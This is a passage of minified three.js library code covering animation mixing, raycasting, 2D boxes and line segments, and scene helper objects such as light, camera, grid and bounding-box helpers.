t=this._actions,i=e._cacheIndex,n=--this._nActiveActions,r=t[n];e._cacheIndex=n,t[n]=e,r._cacheIndex=i,t[i]=r},_addInactiveBinding:function(e,t,i){var n=this._bindingsByRootAndName,r=n[t],o=this._bindings;void 0===r&&(r={},n[t]=r),r[i]=e,e._cacheIndex=o.length,o.push(e)},_removeInactiveBinding:function(e){var t=this._bindings,i=e.binding,n=i.rootNode.uuid,r=i.path,o=this._bindingsByRootAndName,a=o[n],s=t[t.length-1],c=e._cacheIndex;s._cacheIndex=c,t[c]=s,t.pop(),delete a[r],0===Object.keys(a).length&&delete o[n]},_lendBinding:function(e){var t=this._bindings,i=e._cacheIndex,n=this._nActiveBindings++,r=t[n];e._cacheIndex=n,t[n]=e,r._cacheIndex=i,t[i]=r},_takeBackBinding:function(e){var t=this._bindings,i=e._cacheIndex,n=--this._nActiveBindings,r=t[n];e._cacheIndex=n,t[n]=e,r._cacheIndex=i,t[i]=r},_lendControlInterpolant:function(){var e=this._controlInterpolants,t=this._nActiveControlInterpolants++,i=e[t];return void 0===i&&((i=new Ba(new Float32Array(2),new Float32Array(2),1,this._controlInterpolantsResultBuffer)).__cacheIndex=t,e[t]=i),i},_takeBackControlInterpolant:function(e){var t=this._controlInterpolants,i=e.__cacheIndex,n=--this._nActiveControlInterpolants,r=t[n];e.__cacheIndex=n,t[n]=e,r.__cacheIndex=i,t[i]=r},_controlInterpolantsResultBuffer:new Float32Array(1),clipAction:function(e,t){var i=t||this._root,n=i.uuid,r="string"==typeof e?Wa.findByName(i,e):e,o=null!==r?r.uuid:e,a=this._actionsByClip[o],s=null;if(void 0!==a){var c=a.actionByRoot[n];if(void 0!==c)return c;s=a.knownActions[0],null===r&&(r=s._clip)}if(null===r)return null;var l=new Bc(this,r,t);return this._bindAction(l,s),this._addInactiveAction(l,o,n),l},existingAction:function(e,t){var i=t||this._root,n=i.uuid,r="string"==typeof e?Wa.findByName(i,e):e,o=r?r.uuid:e,a=this._actionsByClip[o];return void 0!==a&&a.actionByRoot[n]||null},stopAllAction:function(){var e=this._actions,t=this._nActiveActions,i=this._bindings,n=this._nActiveBindings;this._nActiveActions=0,this._nActiveBindings=0;for(var r=0;r!==t;++r)e[r].reset();for(r=0;r!==n;++r)i[r].useCount=0;return this},update:function(e){e*=this.timeScale;for(var t=this._actions,i=this._nActiveActions,n=this.time+=e,r=Math.sign(e),o=this._accuIndex^=1,a=0;a!==i;++a){t[a]._update(n,e,r,o)}var s=this._bindings,c=this._nActiveBindings;for(a=0;a!==c;++a)s[a].apply(o);return this},setTime:function(e){this.time=0;for(var t=0;t<this._actions.length;t++)this._actions[t].time=0;return this.update(e)},getRoot:function(){return this._root},uncacheClip:function(e){var t=this._actions,i=e.uuid,n=this._actionsByClip,r=n[i];if(void 0!==r){for(var o=r.knownActions,a=0,s=o.length;a!==s;++a){var c=o[a];this._deactivateAction(c);var l=c._cacheIndex,h=t[t.length-1];c._cacheIndex=null,c._byClipCacheIndex=null,h._cacheIndex=l,t[l]=h,t.pop(),this._removeInactiveBindingsForAction(c)}delete n[i]}},uncacheRoot:function(e){var t=e.uuid,i=this._actionsByClip;for(var n in i){var r=i[n].actionByRoot[t];void 0!==r&&(this._deactivateAction(r),this._removeInactiveAction(r))}var o=this._bindingsByRootAndName[t];if(void 0!==o)for(var a in o){var s=o[a];s.restoreOriginalState(),this._removeInactiveBinding(s)}},uncacheAction:function(e,t){var i=this.existingAction(e,t);null!==i&&(this._deactivateAction(i),this._removeInactiveAction(i))}}),zc.prototype.clone=function(){return new zc(void 0===this.value.clone?this.value:this.value.clone())},Fc.prototype=Object.assign(Object.create(pr.prototype),{constructor:Fc,isInstancedInterleavedBuffer:!0,copy:function(e){return pr.prototype.copy.call(this,e),this.meshPerAttribute=e.meshPerAttribute,this}}),Object.defineProperties(Fc.prototype,{meshPerAttribute:{get:function(){return this._meshPerAttribute},set:function(e){this._meshPerAttribute=e,this.versionVAO++}}}),Object.assign(Nc.prototype,{linePrecision:1,set:function(e,t){this.ray.set(e,t)},setFromCamera:function(e,t){t&&t.isPerspectiveCamera?(this.ray.origin.setFromMatrixPosition(t.matrixWorld),this.ray.direction.set(e.x,e.y,.5).unproject(t).sub(this.ray.origin).normalize(),this.camera=t):t&&t.isOrthographicCamera?(this.ray.origin.set(e.x,e.y,(t.near+t.far)/(t.near-t.far)).unproject(t),this.ray.direction.set(0,0,-1).transformDirection(t.matrixWorld),this.camera=t):console.error("THREE.Raycaster: Unsupported camera type.")},intersectObject:function(e,t,i){var n=i||[];return Uc(e,this,n,t),n.sort(jc),n},intersectObjects:function(e,t,i){var n=i||[];if(!1===Array.isArray(e))return console.warn("THREE.Raycaster.intersectObjects: objects is not an Array."),n;for(var r=0,o=e.length;r<o;r++)Uc(e[r],this,n,t);return n.sort(jc),n}}),Object.assign(Vc.prototype,{set:function(e,t,i){return this.radius=e,this.phi=t,this.theta=i,this},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.radius=e.radius,this.phi=e.phi,this.theta=e.theta,this},makeSafe:function(){return this.phi=Math.max(1e-6,Math.min(Math.PI-1e-6,this.phi)),this},setFromVector3:function(e){return this.setFromCartesianCoords(e.x,e.y,e.z)},setFromCartesianCoords:function(e,t,i){return this.radius=Math.sqrt(e*e+t*t+i*i),0===this.radius?(this.theta=0,this.phi=0):(this.theta=Math.atan2(e,i),this.phi=Math.acos(p.clamp(t/this.radius,-1,1))),this}}),Object.assign(function(e,t,i){return this.radius=void 0!==e?e:1,this.theta=void 0!==t?t:0,this.y=void 0!==i?i:0,this}.prototype,{set:function(e,t,i){return this.radius=e,this.theta=t,this.y=i,this},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.radius=e.radius,this.theta=e.theta,this.y=e.y,this},setFromVector3:function(e){return this.setFromCartesianCoords(e.x,e.y,e.z)},setFromCartesianCoords:function(e,t,i){return this.radius=Math.sqrt(e*e+i*i),this.theta=Math.atan2(e,i),this.y=t,this}});var Hc=new f;function Gc(e,t){this.min=void 0!==e?e:new f(1/0,1/0),this.max=void 0!==t?t:new f(-1/0,-1/0)}Object.assign(Gc.prototype,{set:function(e,t){return this.min.copy(e),this.max.copy(t),this},setFromPoints:function(e){this.makeEmpty();for(var t=0,i=e.length;t<i;t++)this.expandByPoint(e[t]);return this},setFromCenterAndSize:function(e,t){var i=Hc.copy(t).multiplyScalar(.5);return this.min.copy(e).sub(i),this.max.copy(e).add(i),this},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.min.copy(e.min),this.max.copy(e.max),this},makeEmpty:function(){return this.min.x=this.min.y=1/0,this.max.x=this.max.y=-1/0,this},isEmpty:function(){return this.max.x<this.min.x||this.max.y<this.min.y},getCenter:function(e){return void 0===e&&(console.warn("THREE.Box2: .getCenter() target is now required"),e=new f),this.isEmpty()?e.set(0,0):e.addVectors(this.min,this.max).multiplyScalar(.5)},getSize:function(e){return void 0===e&&(console.warn("THREE.Box2: .getSize() target is now required"),e=new f),this.isEmpty()?e.set(0,0):e.subVectors(this.max,this.min)},expandByPoint:function(e){return this.min.min(e),this.max.max(e),this},expandByVector:function(e){return this.min.sub(e),this.max.add(e),this},expandByScalar:function(e){return this.min.addScalar(-e),this.max.addScalar(e),this},containsPoint:function(e){return!(e.x<this.min.x||e.x>this.max.x||e.y<this.min.y||e.y>this.max.y)},containsBox:function(e){return this.min.x<=e.min.x&&e.max.x<=this.max.x&&this.min.y<=e.min.y&&e.max.y<=this.max.y},getParameter:function(e,t){return void 0===t&&(console.warn("THREE.Box2: .getParameter() target is now required"),t=new f),t.set((e.x-this.min.x)/(this.max.x-this.min.x),(e.y-this.min.y)/(this.max.y-this.min.y))},intersectsBox:function(e){return!(e.max.x<this.min.x||e.min.x>this.max.x||e.max.y<this.min.y||e.min.y>this.max.y)},clampPoint:function(e,t){return void 0===t&&(console.warn("THREE.Box2: .clampPoint() target is now required"),t=new f),t.copy(e).clamp(this.min,this.max)},distanceToPoint:function(e){return Hc.copy(e).clamp(this.min,this.max).sub(e).length()},intersect:function(e){return this.min.max(e.min),this.max.min(e.max),this},union:function(e){return this.min.min(e.min),this.max.max(e.max),this},translate:function(e){return this.min.add(e),this.max.add(e),this},equals:function(e){return e.min.equals(this.min)&&e.max.equals(this.max)}});var Wc=new y,qc=new y;function Xc(e,t){this.start=void 0!==e?e:new y,this.end=void 0!==t?t:new y}function Yc(e){K.call(this),this.material=e,this.render=function(){}}Object.assign(Xc.prototype,{set:function(e,t){return this.start.copy(e),this.end.copy(t),this},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.start.copy(e.start),this.end.copy(e.end),this},getCenter:function(e){return void 0===e&&(console.warn("THREE.Line3: .getCenter() target is now required"),e=new y),e.addVectors(this.start,this.end).multiplyScalar(.5)},delta:function(e){return void 0===e&&(console.warn("THREE.Line3: .delta() target is now required"),e=new y),e.subVectors(this.end,this.start)},distanceSq:function(){return this.start.distanceToSquared(this.end)},distance:function(){return this.start.distanceTo(this.end)},at:function(e,t){return void 0===t&&(console.warn("THREE.Line3: .at() target is now required"),t=new y),this.delta(t).multiplyScalar(e).add(this.start)},closestPointToPointParameter:function(e,t){Wc.subVectors(e,this.start),qc.subVectors(this.end,this.start);var i=qc.dot(qc),n=qc.dot(Wc)/i;return t&&(n=p.clamp(n,0,1)),n},closestPointToPoint:function(e,t,i){var n=this.closestPointToPointParameter(e,t);return void 0===i&&(console.warn("THREE.Line3: .closestPointToPoint() target is now required"),i=new y),this.delta(i).multiplyScalar(n).add(this.start)},applyMatrix4:function(e){return this.start.applyMatrix4(e),this.end.applyMatrix4(e),this},equals:function(e){return e.start.equals(this.start)&&e.end.equals(this.end)}}),Yc.prototype=Object.create(K.prototype),Yc.prototype.constructor=Yc,Yc.prototype.isImmediateRenderObject=!0;var Zc=new y,Qc=new y,$c=new x,Jc=["a","b","c"];function Kc(e,t,i,n){this.object=e,this.size=void 0!==t?t:1;var r=void 0!==i?i:16711680,o=void 0!==n?n:1,a=0,s=this.object.geometry;s&&s.isGeometry?a=3*s.faces.length:s&&s.isBufferGeometry&&(a=s.attributes.normal.count);var c=new dt,l=new tt(2*a*3,3);c.addAttribute("position",l),Yr.call(this,c,new Nr({color:r,linewidth:o})),this.matrixAutoUpdate=!1,this.update()}Kc.prototype=Object.create(Yr.prototype),Kc.prototype.constructor=Kc,Kc.prototype.update=function(){this.object.updateMatrixWorld(!0),$c.getNormalMatrix(this.object.matrixWorld);var e=this.object.matrixWorld,t=this.geometry.attributes.position,i=this.object.geometry;if(i&&i.isGeometry)for(var n=i.vertices,r=i.faces,o=0,a=0,s=r.length;a<s;a++)for(var c=r[a],l=0,h=c.vertexNormals.length;l<h;l++){var u=n[c[Jc[l]]],d=c.vertexNormals[l];Zc.copy(u).applyMatrix4(e),Qc.copy(d).applyMatrix3($c).normalize().multiplyScalar(this.size).add(Zc),t.setXYZ(o,Zc.x,Zc.y,Zc.z),o+=1,t.setXYZ(o,Qc.x,Qc.y,Qc.z),o+=1}else if(i&&i.isBufferGeometry){var p=i.attributes.position,f=i.attributes.normal;for(o=0,l=0,h=p.count;l<h;l++)Zc.set(p.getX(l),p.getY(l),p.getZ(l)).applyMatrix4(e),Qc.set(f.getX(l),f.getY(l),f.getZ(l)),Qc.applyMatrix3($c).normalize().multiplyScalar(this.size).add(Zc),t.setXYZ(o,Zc.x,Zc.y,Zc.z),o+=1,t.setXYZ(o,Qc.x,Qc.y,Qc.z),o+=1}t.needsUpdate=!0};var el=new y;function tl(e,t){K.call(this),this.light=e,this.light.updateMatrixWorld(),this.matrix=e.matrixWorld,this.matrixAutoUpdate=!1,this.color=t;for(var i=new dt,n=[0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,-1,0,1,0,0,0,0,1,1,0,0,0,0,-1,1],r=0,o=1;r<32;r++,o++){var a=r/32*Math.PI*2,s=o/32*Math.PI*2;n.push(Math.cos(a),Math.sin(a),1,Math.cos(s),Math.sin(s),1)}i.addAttribute("position",new tt(n,3));var c=new Nr({fog:!1});this.cone=new Yr(i,c),this.add(this.cone),this.update()}tl.prototype=Object.create(K.prototype),tl.prototype.constructor=tl,tl.prototype.dispose=function(){this.cone.geometry.dispose(),this.cone.material.dispose()},tl.prototype.update=function(){this.light.updateMatrixWorld();var e=this.light.distance?this.light.distance:1e3,t=e*Math.tan(this.light.angle);this.cone.scale.set(t,t,e),el.setFromMatrixPosition(this.light.target.matrixWorld),this.cone.lookAt(el),void 0!==this.color?this.cone.material.color.set(this.color):this.cone.material.color.copy(this.light.color)};var il=new y,nl=new B,rl=new B;function ol(e){for(var t=function e(t){var i=[];t&&t.isBone&&i.push(t);for(var n=0;n<t.children.length;n++)i.push.apply(i,e(t.children[n]));return i}(e),i=new dt,n=[],r=[],o=new Ne(0,0,1),a=new Ne(0,1,0),s=0;s<t.length;s++){var c=t[s];c.parent&&c.parent.isBone&&(n.push(0,0,0),n.push(0,0,0),r.push(o.r,o.g,o.b),r.push(a.r,a.g,a.b))}i.addAttribute("position",new tt(n,3)),i.addAttribute("color",new tt(r,3));var l=new Nr({vertexColors:2,depthTest:!1,depthWrite:!1,transparent:!0});Yr.call(this,i,l),this.root=e,this.bones=t,this.matrix=e.matrixWorld,this.matrixAutoUpdate=!1}function al(e,t,i){this.light=e,this.light.updateMatrixWorld(),this.color=i;var n=new oa(t,4,2),r=new qe({wireframe:!0,fog:!1});Lt.call(this,n,r),this.matrix=this.light.matrixWorld,this.matrixAutoUpdate=!1,this.update()}function sl(e,t){this.type="RectAreaLightHelper",this.light=e,this.color=t;var i=new dt;i.addAttribute("position",new tt([1,1,0,-1,1,0,-1,-1,0,1,-1,0,1,1,0],3)),i.computeBoundingSphere();var n=new Nr({fog:!1});Wr.call(this,i,n);var r=new dt;r.addAttribute("position",new tt([1,1,0,-1,1,0,-1,-1,0,1,1,0,-1,-1,0,1,-1,0],3)),r.computeBoundingSphere(),this.add(new Lt(r,new qe({side:1,fog:!1}))),this.update()}ol.prototype=Object.create(Yr.prototype),ol.prototype.constructor=ol,ol.prototype.updateMatrixWorld=function(e){var t=this.bones,i=this.geometry,n=i.getAttribute("position");rl.getInverse(this.root.matrixWorld);for(var r=0,o=0;r<t.length;r++){var a=t[r];a.parent&&a.parent.isBone&&(nl.multiplyMatrices(rl,a.matrixWorld),il.setFromMatrixPosition(nl),n.setXYZ(o,il.x,il.y,il.z),nl.multiplyMatrices(rl,a.parent.matrixWorld),il.setFromMatrixPosition(nl),n.setXYZ(o+1,il.x,il.y,il.z),o+=2)}i.getAttribute("position").needsUpdate=!0,K.prototype.updateMatrixWorld.call(this,e)},al.prototype=Object.create(Lt.prototype),al.prototype.constructor=al,al.prototype.dispose=function(){this.geometry.dispose(),this.material.dispose()},al.prototype.update=function(){void 0!==this.color?this.material.color.set(this.color):this.material.color.copy(this.light.color)},sl.prototype=Object.create(Wr.prototype),sl.prototype.constructor=sl,sl.prototype.update=function(){if(this.scale.set(.5*this.light.width,.5*this.light.height,1),void 0!==this.color)this.material.color.set(this.color),this.children[0].material.color.set(this.color);else{this.material.color.copy(this.light.color).multiplyScalar(this.light.intensity);var e=this.material.color,t=Math.max(e.r,e.g,e.b);t>1&&e.multiplyScalar(1/t),this.children[0].material.color.copy(this.material.color)}},sl.prototype.dispose=function(){this.geometry.dispose(),this.material.dispose(),this.children[0].geometry.dispose(),this.children[0].material.dispose()};var cl=new y,ll=new Ne,hl=new Ne;function ul(e,t,i){K.call(this),this.light=e,this.light.updateMatrixWorld(),this.matrix=e.matrixWorld,this.matrixAutoUpdate=!1,this.color=i;var n=new vo(t);n.rotateY(.5*Math.PI),this.material=new qe({wireframe:!0,fog:!1}),void 0===this.color&&(this.material.vertexColors=2);var r=n.getAttribute("position"),o=new Float32Array(3*r.count);n.addAttribute("color",new Xe(o,3)),this.add(new Lt(n,this.material)),this.update()}function dl(e,t){this.lightProbe=e,this.size=t;var i={GAMMA_OUTPUT:""},n=new Vt({defines:i,uniforms:{sh:{value:this.lightProbe.sh.coefficients},intensity:{value:this.lightProbe.intensity}},vertexShader:["varying vec3 vNormal;","void main() {","\tvNormal = normalize( normalMatrix * normal );","\tgl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["#define RECIPROCAL_PI 0.318309886","vec3 inverseTransformDirection( in vec3 normal, in mat4 matrix ) {","\t// matrix is assumed to be orthogonal","\treturn normalize( ( vec4( normal, 0.0 ) * matrix ).xyz );","}","vec3 linearToOutput( in vec3 a ) {","\t#ifdef GAMMA_OUTPUT","\t\treturn pow( a, vec3( 1.0 / float( GAMMA_FACTOR ) ) );","\t#else","\t\treturn a;","\t#endif","}","// source: https://graphics.stanford.edu/papers/envmap/envmap.pdf","vec3 shGetIrradianceAt( in vec3 normal, in vec3 shCoefficients[ 9 ] ) {","\t// normal is assumed to have unit length","\tfloat x = normal.x, y = normal.y, z = normal.z;","\t// band 0","\tvec3 result = shCoefficients[ 0 ] * 0.886227;","\t// band 1","\tresult += shCoefficients[ 1 ] * 2.0 * 0.511664 * y;","\tresult += shCoefficients[ 2 ] * 2.0 * 0.511664 * z;","\tresult += shCoefficients[ 3 ] * 2.0 * 0.511664 * x;","\t// band 2","\tresult += shCoefficients[ 4 ] * 2.0 * 0.429043 * x * y;","\tresult += shCoefficients[ 5 ] * 2.0 * 0.429043 * y * z;","\tresult += shCoefficients[ 6 ] * ( 0.743125 * z * z - 0.247708 );","\tresult += shCoefficients[ 7 ] * 2.0 * 0.429043 * x * z;","\tresult += shCoefficients[ 8 ] * 0.429043 * ( x * x - y * y );","\treturn result;","}","uniform vec3 sh[ 9 ]; // sh coefficients","uniform float intensity; // light probe intensity","varying vec3 vNormal;","void main() {","\tvec3 normal = normalize( vNormal );","\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );","\tvec3 irradiance = shGetIrradianceAt( worldNormal, sh );","\tvec3 outgoingLight = RECIPROCAL_PI * irradiance * intensity;","\toutgoingLight = linearToOutput( outgoingLight );","\tgl_FragColor = vec4( outgoingLight, 1.0 );","}"].join("\n")}),r=new oa(1,32,16);Lt.call(this,r,n),this.onBeforeRender()}function pl(e,t,i,n){e=e||10,t=t||10,i=new Ne(void 0!==i?i:4473924),n=new Ne(void 0!==n?n:8947848);for(var r=t/2,o=e/t,a=e/2,s=[],c=[],l=0,h=0,u=-a;l<=t;l++,u+=o){s.push(-a,0,u,a,0,u),s.push(u,0,-a,u,0,a);var d=l===r?i:n;d.toArray(c,h),h+=3,d.toArray(c,h),h+=3,d.toArray(c,h),h+=3,d.toArray(c,h),h+=3}var p=new dt;p.addAttribute("position",new tt(s,3)),p.addAttribute("color",new tt(c,3));var f=new Nr({vertexColors:2});Yr.call(this,p,f)}function fl(e,t,i,n,r,o){e=e||10,t=t||16,i=i||8,n=n||64,r=new Ne(void 0!==r?r:4473924),o=new Ne(void 0!==o?o:8947848);var a,s,c,l,h,u,d,p=[],f=[];for(l=0;l<=t;l++)c=l/t*(2*Math.PI),a=Math.sin(c)*e,s=Math.cos(c)*e,p.push(0,0,0),p.push(a,0,s),d=1&l?r:o,f.push(d.r,d.g,d.b),f.push(d.r,d.g,d.b);for(l=0;l<=i;l++)for(d=1&l?r:o,u=e-e/i*l,h=0;h<n;h++)c=h/n*(2*Math.PI),a=Math.sin(c)*u,s=Math.cos(c)*u,p.push(a,0,s),f.push(d.r,d.g,d.b),c=(h+1)/n*(2*Math.PI),a=Math.sin(c)*u,s=Math.cos(c)*u,p.push(a,0,s),f.push(d.r,d.g,d.b);var m=new dt;m.addAttribute("position",new tt(p,3)),m.addAttribute("color",new tt(f,3));var v=new Nr({vertexColors:2});Yr.call(this,m,v)}function ml(e,t,i,n){this.audio=e,this.range=t||1,this.divisionsInnerAngle=i||16,this.divisionsOuterAngle=n||2;var r=new dt,o=this.divisionsInnerAngle+2*this.divisionsOuterAngle,a=new Float32Array(3*(3*o+3));r.addAttribute("position",new Xe(a,3));var s=new Nr({color:65280}),c=new Nr({color:16776960});Wr.call(this,r,[c,s]),this.update()}ul.prototype=Object.create(K.prototype),ul.prototype.constructor=ul,ul.prototype.dispose=function(){this.children[0].geometry.dispose(),this.children[0].material.dispose()},ul.prototype.update=function(){var e=this.children[0];if(void 0!==this.color)this.material.color.set(this.color);else{var t=e.geometry.getAttribute("color");ll.copy(this.light.color),hl.copy(this.light.groundColor);for(var i=0,n=t.count;i<n;i++){var r=i<n/2?ll:hl;t.setXYZ(i,r.r,r.g,r.b)}t.needsUpdate=!0}e.lookAt(cl.setFromMatrixPosition(this.light.matrixWorld).negate())},dl.prototype=Object.create(Lt.prototype),dl.prototype.constructor=dl,dl.prototype.dispose=function(){this.geometry.dispose(),this.material.dispose()},dl.prototype.onBeforeRender=function(){this.position.copy(this.lightProbe.position),this.scale.set(1,1,1).multiplyScalar(this.size),this.material.uniforms.intensity.value=this.lightProbe.intensity},pl.prototype=Object.assign(Object.create(Yr.prototype),{constructor:pl,copy:function(e){return Yr.prototype.copy.call(this,e),this.geometry.copy(e.geometry),this.material.copy(e.material),this},clone:function(){return(new this.constructor).copy(this)}}),fl.prototype=Object.create(Yr.prototype),fl.prototype.constructor=fl,ml.prototype=Object.create(Wr.prototype),ml.prototype.constructor=ml,ml.prototype.update=function(){var e,t,i=this.audio,n=this.range,r=this.divisionsInnerAngle,o=this.divisionsOuterAngle,a=p.degToRad(i.panner.coneInnerAngle),s=p.degToRad(i.panner.coneOuterAngle),c=a/2,l=s/2,h=0,u=0,d=this.geometry,f=d.attributes.position;function m(i,r,o,a){var s=(r-i)/o;for(f.setXYZ(h,0,0,0),u++,e=i;e<r;e+=s)t=h+u,f.setXYZ(t,Math.sin(e)*n,0,Math.cos(e)*n),f.setXYZ(t+1,Math.sin(Math.min(e+s,r))*n,0,Math.cos(Math.min(e+s,r))*n),f.setXYZ(t+2,0,0,0),u+=3;d.addGroup(h,u,a),h+=u,u=0}d.clearGroups(),m(-l,-c,o,0),m(-c,c,r,1),m(c,l,o,0),f.needsUpdate=!0,a===s&&(this.material[0].visible=!1)},ml.prototype.dispose=function(){this.geometry.dispose(),this.material[0].dispose(),this.material[1].dispose()};var vl=new y,gl=new y,yl=new x;function bl(e,t,i,n){this.object=e,this.size=void 0!==t?t:1;var r=void 0!==i?i:16776960,o=void 0!==n?n:1,a=0,s=this.object.geometry;s&&s.isGeometry?a=s.faces.length:console.warn("THREE.FaceNormalsHelper: only THREE.Geometry is supported. Use THREE.VertexNormalsHelper, instead.");var c=new dt,l=new tt(2*a*3,3);c.addAttribute("position",l),Yr.call(this,c,new Nr({color:r,linewidth:o})),this.matrixAutoUpdate=!1,this.update()}bl.prototype=Object.create(Yr.prototype),bl.prototype.constructor=bl,bl.prototype.update=function(){this.object.updateMatrixWorld(!0),yl.getNormalMatrix(this.object.matrixWorld);for(var e=this.object.matrixWorld,t=this.geometry.attributes.position,i=this.object.geometry,n=i.vertices,r=i.faces,o=0,a=0,s=r.length;a<s;a++){var c=r[a],l=c.normal;vl.copy(n[c.a]).add(n[c.b]).add(n[c.c]).divideScalar(3).applyMatrix4(e),gl.copy(l).applyMatrix3(yl).normalize().multiplyScalar(this.size).add(vl),t.setXYZ(o,vl.x,vl.y,vl.z),o+=1,t.setXYZ(o,gl.x,gl.y,gl.z),o+=1}t.needsUpdate=!0};var wl=new y,xl=new y,_l=new y;function Ml(e,t,i){K.call(this),this.light=e,this.light.updateMatrixWorld(),this.matrix=e.matrixWorld,this.matrixAutoUpdate=!1,this.color=i,void 0===t&&(t=1);var n=new dt;n.addAttribute("position",new tt([-t,t,0,t,t,0,t,-t,0,-t,-t,0,-t,t,0],3));var r=new Nr({fog:!1});this.lightPlane=new Wr(n,r),this.add(this.lightPlane),(n=new dt).addAttribute("position",new tt([0,0,0,0,0,1],3)),this.targetLine=new Wr(n,r),this.add(this.targetLine),this.update()}Ml.prototype=Object.create(K.prototype),Ml.prototype.constructor=Ml,Ml.prototype.dispose=function(){this.lightPlane.geometry.dispose(),this.lightPlane.material.dispose(),this.targetLine.geometry.dispose(),this.targetLine.material.dispose()},Ml.prototype.update=function(){wl.setFromMatrixPosition(this.light.matrixWorld),xl.setFromMatrixPosition(this.light.target.matrixWorld),_l.subVectors(xl,wl),this.lightPlane.lookAt(xl),void 0!==this.color?(this.lightPlane.material.color.set(this.color),this.targetLine.material.color.set(this.color)):(this.lightPlane.material.color.copy(this.light.color),this.targetLine.material.color.copy(this.light.color)),this.targetLine.lookAt(xl),this.targetLine.scale.z=_l.length()};var Sl=new y,Tl=new Ht;function El(e){var t=new dt,i=new Nr({color:16777215,vertexColors:1}),n=[],r=[],o={},a=new Ne(16755200),s=new Ne(16711680),c=new Ne(43775),l=new Ne(16777215),h=new Ne(3355443);function u(e,t,i){d(e,i),d(t,i)}function d(e,t){n.push(0,0,0),r.push(t.r,t.g,t.b),void 0===o[e]&&(o[e]=[]),o[e].push(n.length/3-1)}u("n1","n2",a),u("n2","n4",a),u("n4","n3",a),u("n3","n1",a),u("f1","f2",a),u("f2","f4",a),u("f4","f3",a),u("f3","f1",a),u("n1","f1",a),u("n2","f2",a),u("n3","f3",a),u("n4","f4",a),u("p","n1",s),u("p","n2",s),u("p","n3",s),u("p","n4",s),u("u1","u2",c),u("u2","u3",c),u("u3","u1",c),u("c","t",l),u("p","c",h),u("cn1","cn2",h),u("cn3","cn4",h),u("cf1","cf2",h),u("cf3","cf4",h),t.addAttribute("position",new tt(n,3)),t.addAttribute("color",new tt(r,3)),Yr.call(this,t,i),this.camera=e,this.camera.updateProjectionMatrix&&this.camera.updateProjectionMatrix(),this.matrix=e.matrixWorld,this.matrixAutoUpdate=!1,this.pointMap=o,this.update()}function Al(e,t,i,n,r,o,a){Sl.set(r,o,a).unproject(n);var s=t[e];if(void 0!==s)for(var c=i.getAttribute("position"),l=0,h=s.length;l<h;l++)c.setXYZ(s[l],Sl.x,Sl.y,Sl.z)}El.prototype=Object.create(Yr.prototype),El.prototype.constructor=El,El.prototype.update=function(){var e=this.geometry,t=this.pointMap;Tl.projectionMatrixInverse.copy(this.camera.projectionMatrixInverse),Al("c",t,e,Tl,0,0,-1),Al("t",t,e,Tl,0,0,1),Al("n1",t,e,Tl,-1,-1,-1),Al("n2",t,e,Tl,1,-1,-1),Al("n3",t,e,Tl,-1,1,-1),Al("n4",t,e,Tl,1,1,-1),Al("f1",t,e,Tl,-1,-1,1),Al("f2",t,e,Tl,1,-1,1),Al("f3",t,e,Tl,-1,1,1),Al("f4",t,e,Tl,1,1,1),Al("u1",t,e,Tl,.7,1.1,-1),Al("u2",t,e,Tl,-.7,1.1,-1),Al("u3",t,e,Tl,0,2,-1),Al("cf1",t,e,Tl,-1,0,1),Al("cf2",t,e,Tl,1,0,1),Al("cf3",t,e,Tl,0,-1,1),Al("cf4",t,e,Tl,0,1,1),Al("cn1",t,e,Tl,-1,0,-1),Al("cn2",t,e,Tl,1,0,-1),Al("cn3",t,e,Tl,0,-1,-1),Al("cn4",t,e,Tl,0,1,-1),e.getAttribute("position").needsUpdate=!0};var Cl=new pe;function Pl(e,t){this.object=e,void 0===t&&(t=16776960);var i=new Uint16Array([0,1,1,2,2,3,3,0,4,5,5,6,6,7,7,4,0,4,1,5,2,6,3,7]),n=new Float32Array(24),r=new dt;r.setIndex(new Xe(i,1)),r.addAttribute("position",new Xe(n,3)),Yr.call(this,r,new Nr({color:t})),this.matrixAutoUpdate=!1,this.update()}function Ll(e,t){this.type="Box3Helper",this.box=e,t=t||16776960;var i=new Uint16Array([0,1,1,2,2,3,3,0,4,5,5,6,6,7,7,4,0,4,1,5,2,6,3,7]),n=new dt;n.setIndex(new Xe(i,1)),n.addAttribute("position",new tt([1,1,1,-1,1,1,-1,-1,1,1,-1,1,1,1,-1,-1,1,-1,-1,-1,-1,1,-1,-1],3)),Yr.call(this,n,new Nr({color:t})),this.geometry.computeBoundingSphere()}function Rl(e,t,i){this.type="PlaneHelper",this.plane=e,this.size=void 0===t?1:t;var n=void 0!==i?i:16776960,r=new dt;r.addAttribute("position",new tt([1,-1,1,-1,1,1,-1,-1,1,1,1,1,-1,1,1,-1,-1,1,1,-1,1,1,1,1,0,0,1,0,0,0],3)),r.computeBoundingSphere(),Wr.call(this,r,new Nr({color:n}));var o=new dt;o.addAttribute("position",new tt([1,1,1,-1,1,1,-1,-1,1,1,1,1,-1,-1,1,1,-1,1],3)),o.computeBoundingSphere(),this.add(new Lt(o,new qe({color:n,opacity:.2,transparent:!0,depthWrite:!1})))}Pl.prototype=Object.create(Yr.prototype),Pl.prototype.constructor=Pl,Pl.prototype.update=function(e){if(void 0!==e&&console.warn("THREE.BoxHelper: .update() has no longer arguments."),void 0!==this.object&&Cl.setFromObject(this.object),!Cl.isEmpty()){var t=Cl.min,i=Cl.max,n=this.geometry.attributes.position,r=n.array;r[0]=i.x,r[1]=i.y,r[2]=i.z,r[3]=t.x,r[4]=i.y,r[5]=i.z,r[6]=t.x,r[7]=t.y,r[8]=i.z,r[9]=i.x,r[10]=t.y,r[11]=i.z,r[12]=i.x,r[13]=i.y,r[14]=t.z,r[15]=t.x,r[16]=i.y,r[17]=t.z,r[18]=t.x,r[19]=t.y,r[20]=t.z,r[21]=i.x,r[22]=t.y,r[23]=t.z,n.needsUpdate=!0,this.geometry.computeBoundingSphere()}},Pl.prototype.setFromObject=function(e){return this.object=e,this.update(),this},Pl.prototype.copy=function(e){return Yr.prototype.copy.call(this,e),this.object=e.object,this},Pl.prototype.clone=function(){return(new this.constructor).copy(this)},Ll.prototype=Object.create(Yr.prototype),Ll.prototype.constructor=Ll,Ll.prototype.updateMatrixWorld=function(e){var 